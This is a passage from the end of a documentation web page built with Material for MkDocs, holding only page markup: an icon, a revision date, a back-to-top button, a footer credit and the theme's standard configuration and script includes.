      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14.47 15.08 11 13V7h1.5v5.25l3.08 1.83c-.41.28-.79.62-1.11 1m-1.39 4.84c-.36.05-.71.08-1.08.08-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8c0 .37-.03.72-.08 1.08.69.1 1.33.32 1.92.64.1-.56.16-1.13.16-1.72 0-5.5-4.5-10-10-10S2 6.5 2 12s4.47 10 10 10c.59 0 1.16-.06 1.72-.16-.32-.59-.54-1.23-.64-1.92M18 15v3h-3v2h3v3h2v-3h3v-2h-3v-3z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date" title="July 4, 2025 11:38:18 UTC">July 4, 2025</span>
  </span>

    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "navigation.sections", "navigation.expand", "navigation.top", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.56ea9cef.min.js"></script>
      
    
  </body>
</html>